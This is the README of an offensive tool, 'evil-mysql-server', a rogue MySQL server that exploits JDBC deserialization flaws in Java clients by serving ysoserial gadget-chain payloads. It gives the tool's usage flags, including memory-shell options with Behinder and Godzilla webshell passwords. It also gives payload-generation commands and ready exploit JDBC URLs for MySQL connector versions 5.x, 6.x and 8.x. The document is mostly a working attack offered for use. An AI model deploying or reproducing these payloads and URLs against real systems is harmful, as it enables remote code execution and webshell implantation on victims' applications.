# evil mysql server 

## 适配多个 ysoserial 工具 - 20240407


 - https://github.com/frohoff/ysoserial
 - https://github.com/Y4er/ysoserial
 - https://github.com/qi4L/JYso
 - https://github.com/su18/ysoserial

### 前缀说明
```
ysoserial: yso
su18-ysoserial: ysu
JYso: jyso
Y4er-ysoserial: y4ys
```

### 使用示例

```
ysu_CommonsCollections1_EX-Tomcatecho
y4ys_Fastjson1_CLASS:TomcatCmdEcho
```

## 增加对su18-ysu的适配

```
Usage of ./evil-mysql:
  -addr string
        listen addr (default "0.0.0.0:3306")
  -hv string
        MemoryShell binding url pattern (default "https://www.google.com/")
  -java string
        java bin path (default "java")
  -pw string
        Behinder or Godzilla password (default "p@ssw0rd")
  -url string
        ysuserial bin path (default "/testbin")
  -yso string
        ysoserial bin path (default "ysoserial-0.0.6-SNAPSHOT-all.jar")
  -ysu string
        ysuserial bin path (default "ysuserial-1.5-su18-all.jar")
```

**5.1.11-5.x** ysu

```shell
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=ysu_CommonsCollections1_EX-xxxx
```


## 简介

**evil-mysql-server** 是一个针对 jdbc 反序列化漏洞编写的恶意数据库，依赖 ysoserial 。

使用方式

[ysoserial](https://github.com/frohoff/ysoserial)

```shell
./evil-mysql-server -addr 3306 -java java -ysoserial ysoserial-0.0.6-SNAPSHOT-all.jar
```

启动成功后，使用 jdbc 进行连接，其中用户名称格式为 `yso_payload_command` , 连接成功后 `evil-mysql-server` 会解析用户名称，并使用如以下命令生成恶意数据返回到 jdbc 客户端。
```shell
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 calc.exe
```

[ysuserial](https://github.com/su18/ysoserial) 这是一个基于原始ysoserial的增强项目。

```shell
./evil-mysql-server -addr 3306 -java java -ysuserial ysuserial-0.9-su18-all.jar
```

启动成功后，使用 jdbc 进行连接，其中用户名称格式为 `yso_payload_command` , 连接成功后 `evil-mysql-server` 会解析用户名称，并使用如以下命令生成恶意数据返回到 jdbc 客户端。
```shell
java -jar ysuserial-0.9-su18-all.jar -g CommonsCollections1 -p calc.exe
```

## JDBC url 示例

> 使用 ysuserial 时请修改username的前三个字符为 **ysu** 

**5.1.11-5.x**
```shell
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections1_calc.exe
```

**6.x**
```shell
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections1_calc.exe
```

**8.x**
```shell
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections1_calc.exe
```

## 致谢

感谢以下项目，带来的启发

- [MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server)

